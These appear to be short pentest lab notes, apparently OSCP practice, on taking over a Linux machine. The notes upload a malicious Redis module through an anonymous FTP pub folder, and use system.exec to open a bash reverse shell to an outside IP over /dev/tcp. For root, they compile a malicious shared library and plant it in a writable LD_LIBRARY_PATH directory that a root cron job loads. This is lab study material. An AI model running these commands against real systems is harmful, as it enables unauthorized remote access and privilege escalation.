
- Had an FTP that can upload the files to pub folder
Default folder location
```
/var/ftp/pub 
```

- Redis was there and can upload files to the machine so used the below technique
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module
- Took the shell using from redis using below command after loading the file
```bash
module load /var/ftp/pub
```

```bash
system.exec "/bin/bash -i >& /dev/tcp/192.168.45.228/21 0>&1"
```

- For privilege escalation a directory in LD_LIBRARY_PATH was writable
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:**/usr/local/lib/dev:**/usr/local/lib/utils

- Noticed a cron as root to run log-sweep

```bash
ldd /usr/bin/log-sweeper
```

noticed that utils.so is not found.

- Then transferred **mal_so**  in the */home/kali/oscp/linux_tools* to the victim 
- Compiled it 
```bash
mv mal_so utils.c
```

```bash
gcc -o utils.so -shared -fPIC utils.c
```

```bash
chmod 777 utils.so
```

```bash
cp utils.so /usr/local/lib/dev/utils.so
```

https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
